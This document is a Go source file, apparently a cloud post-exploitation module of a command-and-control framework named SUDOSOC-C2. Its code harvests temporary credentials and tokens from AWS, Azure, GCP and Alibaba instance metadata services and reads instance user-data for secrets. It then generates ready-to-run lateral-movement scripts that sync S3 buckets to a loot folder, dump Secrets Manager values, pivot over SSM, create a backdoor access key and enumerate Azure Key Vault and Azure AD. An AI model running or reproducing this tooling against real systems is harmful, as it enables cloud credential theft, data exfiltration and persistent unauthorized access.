package cloud

/*
	SUDOSOC-C2 — Cloud Metadata Service (IMDS) Exploitation
	Copyright (C) 2026  sudosoc — Seif

	Every major cloud provider's VM instances expose a metadata service
	(Instance Metadata Service — IMDS) on a link-local address.
	This service provides temporary credentials, configuration, and
	identity tokens — all accessible from inside a compromised VM
	without any authentication.

	Supported providers:
	  AWS   : http://169.254.169.254/latest/
	  Azure : http://169.254.169.254/metadata/
	  GCP   : http://metadata.google.internal/computeMetadata/
	  Alibaba: http://100.100.100.200/latest/

	What you get:
	  AWS   → IAM role credentials (Access Key, Secret Key, Session Token)
	          → S3 buckets, EC2 instances, Lambda, RDS, etc.
	  Azure → Managed Identity OAuth tokens
	          → Azure AD, Keyvault secrets, Storage accounts
	  GCP   → Service Account tokens
	          → Cloud Storage, BigQuery, Pub/Sub, etc.

	From VM credentials → full cloud environment lateral movement.
*/

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// CloudProvider represents a cloud provider type
type CloudProvider int

const (
	AWS     CloudProvider = iota
	Azure   CloudProvider = iota
	GCP     CloudProvider = iota
	Alibaba CloudProvider = iota
	Unknown CloudProvider = iota
)

// IMDSClient queries the Instance Metadata Service
type IMDSClient struct {
	provider CloudProvider
	client   *http.Client
}

// AWSCredentials holds temporary AWS IAM credentials
type AWSCredentials struct {
	Code            string    `json:"Code"`
	LastUpdated     time.Time `json:"LastUpdated"`
	Type            string    `json:"Type"`
	AccessKeyID     string    `json:"AccessKeyId"`
	SecretAccessKey string    `json:"SecretAccessKey"`
	Token           string    `json:"Token"`
	Expiration      time.Time `json:"Expiration"`
	RoleName        string    // populated separately
}

// AzureToken holds an Azure Managed Identity token
type AzureToken struct {
	AccessToken  string `json:"access_token"`
	ClientID     string `json:"client_id"`
	ExpiresIn    string `json:"expires_in"`
	ExpiresOn    string `json:"expires_on"`
	NotBefore    string `json:"not_before"`
	Resource     string `json:"resource"`
	TokenType    string `json:"token_type"`
}

// GCPToken holds a GCP service account token
type GCPToken struct {
	AccessToken string `json:"access_token"`
	ExpiresIn   int    `json:"expires_in"`
	TokenType   string `json:"token_type"`
}

// CloudMetadata holds all metadata from the IMDS
type CloudMetadata struct {
	Provider      CloudProvider
	InstanceID    string
	Region        string
	InstanceType  string
	PublicIP      string
	PrivateIP     string
	AccountID     string
	Tags          map[string]string
	Roles         []string
	HostName      string
}

// NewIMDSClient creates a new IMDS client
func NewIMDSClient() *IMDSClient {
	return &IMDSClient{
		client: &http.Client{
			Timeout: 5 * time.Second, // fast timeout — if no IMDS, we're not in cloud
		},
	}
}

// DetectProvider auto-detects the cloud provider
func (c *IMDSClient) DetectProvider() CloudProvider {
	providers := []struct {
		url      string
		provider CloudProvider
		header   map[string]string
	}{
		{"http://169.254.169.254/latest/meta-data/ami-id", AWS, nil},
		{"http://169.254.169.254/metadata/instance?api-version=2021-02-01", Azure,
			map[string]string{"Metadata": "true"}},
		{"http://metadata.google.internal/computeMetadata/v1/", GCP,
			map[string]string{"Metadata-Flavor": "Google"}},
		{"http://100.100.100.200/latest/meta-data/", Alibaba, nil},
	}

	for _, p := range providers {
		req, err := http.NewRequest("GET", p.url, nil)
		if err != nil {
			continue
		}
		for k, v := range p.header {
			req.Header.Set(k, v)
		}
		resp, err := c.client.Do(req)
		if err == nil && resp.StatusCode == 200 {
			resp.Body.Close()
			c.provider = p.provider
			return p.provider
		}
		if resp != nil {
			resp.Body.Close()
		}
	}

	c.provider = Unknown
	return Unknown
}

// ── AWS ───────────────────────────────────────────────────────────

// AWSGetCredentials retrieves all IAM role credentials from the AWS IMDS
func (c *IMDSClient) AWSGetCredentials() ([]*AWSCredentials, error) {
	// First get the list of roles
	roles, err := c.awsGet("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
	if err != nil {
		return nil, fmt.Errorf("no IAM role: %v", err)
	}

	roleList := strings.Split(strings.TrimSpace(roles), "\n")
	var creds []*AWSCredentials

	for _, role := range roleList {
		role = strings.TrimSpace(role)
		if role == "" {
			continue
		}
		credJSON, err := c.awsGet(
			"http://169.254.169.254/latest/meta-data/iam/security-credentials/" + role)
		if err != nil {
			continue
		}
		var cred AWSCredentials
		if err := json.Unmarshal([]byte(credJSON), &cred); err != nil {
			continue
		}
		cred.RoleName = role
		creds = append(creds, &cred)
	}
	return creds, nil
}

// AWSGetMetadata returns comprehensive AWS instance metadata
func (c *IMDSClient) AWSGetMetadata() (*CloudMetadata, error) {
	meta := &CloudMetadata{Provider: AWS, Tags: make(map[string]string)}

	meta.InstanceID, _ = c.awsGet("http://169.254.169.254/latest/meta-data/instance-id")
	meta.Region, _ = c.awsGet("http://169.254.169.254/latest/meta-data/placement/region")
	meta.InstanceType, _ = c.awsGet("http://169.254.169.254/latest/meta-data/instance-type")
	meta.PublicIP, _ = c.awsGet("http://169.254.169.254/latest/meta-data/public-ipv4")
	meta.PrivateIP, _ = c.awsGet("http://169.254.169.254/latest/meta-data/local-ipv4")
	meta.AccountID, _ = c.awsGetJSON("http://169.254.169.254/latest/dynamic/instance-identity/document", "accountId")
	meta.HostName, _ = c.awsGet("http://169.254.169.254/latest/meta-data/hostname")

	return meta, nil
}

// AWSGetUserData returns the EC2 instance user-data (bootstrap scripts)
// Often contains credentials, API keys, and configuration
func (c *IMDSClient) AWSGetUserData() (string, error) {
	return c.awsGet("http://169.254.169.254/latest/user-data")
}

func (c *IMDSClient) awsGet(url string) (string, error) {
	// AWS IMDSv2 requires a token first
	tokenReq, _ := http.NewRequest("PUT", "http://169.254.169.254/latest/api/token", nil)
	tokenReq.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")
	tokenResp, err := c.client.Do(tokenReq)

	var token string
	if err == nil && tokenResp.StatusCode == 200 {
		b, _ := io.ReadAll(tokenResp.Body)
		tokenResp.Body.Close()
		token = strings.TrimSpace(string(b))
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", err
	}
	if token != "" {
		req.Header.Set("X-aws-ec2-metadata-token", token)
	}

	resp, err := c.client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return "", fmt.Errorf("HTTP %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	return strings.TrimSpace(string(body)), err
}

func (c *IMDSClient) awsGetJSON(url, field string) (string, error) {
	body, err := c.awsGet(url)
	if err != nil {
		return "", err
	}
	var obj map[string]interface{}
	if err := json.Unmarshal([]byte(body), &obj); err != nil {
		return "", err
	}
	if v, ok := obj[field]; ok {
		return fmt.Sprintf("%v", v), nil
	}
	return "", fmt.Errorf("field %s not found", field)
}

// ── Azure ─────────────────────────────────────────────────────────

// AzureGetToken retrieves an Azure Managed Identity token for a resource
func (c *IMDSClient) AzureGetToken(resource string) (*AzureToken, error) {
	url := fmt.Sprintf(
		"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=%s",
		resource)

	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("Metadata", "true")

	resp, err := c.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var token AzureToken
	if err := json.NewDecoder(resp.Body).Decode(&token); err != nil {
		return nil, err
	}
	return &token, nil
}

// AzureGetAllTokens retrieves tokens for common Azure resources
func (c *IMDSClient) AzureGetAllTokens() map[string]*AzureToken {
	resources := map[string]string{
		"management":   "https://management.azure.com/",
		"graph":        "https://graph.microsoft.com/",
		"keyvault":     "https://vault.azure.net",
		"storage":      "https://storage.azure.com/",
		"sql":          "https://database.windows.net/",
		"servicebus":   "https://servicebus.azure.net/",
	}

	tokens := make(map[string]*AzureToken)
	for name, resource := range resources {
		if tok, err := c.AzureGetToken(resource); err == nil {
			tokens[name] = tok
		}
	}
	return tokens
}

// ── GCP ───────────────────────────────────────────────────────────

// GCPGetToken retrieves a GCP service account token
func (c *IMDSClient) GCPGetToken(scopes string) (*GCPToken, error) {
	url := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
	if scopes != "" {
		url += "?scopes=" + scopes
	}

	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("Metadata-Flavor", "Google")

	resp, err := c.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var token GCPToken
	json.NewDecoder(resp.Body).Decode(&token)
	return &token, nil
}

// ── Lateral Movement Commands ─────────────────────────────────────

// AWSLateralMovementCommands returns commands to use AWS credentials
func AWSLateralMovementCommands(cred *AWSCredentials) string {
	return fmt.Sprintf(`
# AWS Lateral Movement with: %s (expires: %s)
# ================================================

export AWS_ACCESS_KEY_ID="%s"
export AWS_SECRET_ACCESS_KEY="%s"
export AWS_SESSION_TOKEN="%s"

# Enumerate your permissions
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name %s

# List all S3 buckets and download content
aws s3 ls s3://
aws s3 sync s3://sensitive-bucket /tmp/loot/

# List EC2 instances in all regions
for region in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do
  echo "=== $region ==="; aws ec2 describe-instances --region $region \
    --query 'Reservations[].Instances[].[InstanceId,PrivateIpAddress,State.Name]' --output table
done

# Get Secrets Manager secrets
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id PROD/DB/Password

# Pivot to new instance via SSM (no SSH needed!)
aws ssm start-session --target <instance-id>

# Create persistent backdoor (new access key)
aws iam create-access-key --user-name admin-user`,
		cred.RoleName, cred.Expiration.Format(time.RFC3339),
		cred.AccessKeyID, cred.SecretAccessKey, cred.Token,
		cred.RoleName)
}

// AzureLateralMovementCommands returns commands to use Azure tokens
func AzureLateralMovementCommands(tokens map[string]*AzureToken) string {
	managementToken := ""
	if tok, ok := tokens["management"]; ok {
		managementToken = tok.AccessToken[:50] + "..."
	}

	return fmt.Sprintf(`
# Azure Lateral Movement
# ================================================

MGMT_TOKEN="%s..."

# List all subscriptions
curl -H "Authorization: Bearer $MGMT_TOKEN" \
  https://management.azure.com/subscriptions?api-version=2020-01-01

# List Key Vault secrets
curl -H "Authorization: Bearer $KEYVAULT_TOKEN" \
  https://mykeyvault.vault.azure.net/secrets?api-version=7.3

# Access storage account
curl -H "Authorization: Bearer $STORAGE_TOKEN" \
  "https://mystorage.blob.core.windows.net/?comp=list"

# Enumerate Azure AD users (using Graph token)
curl -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/users"

# Get all app registrations (may have secrets)
curl -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/applications"`, managementToken)
}
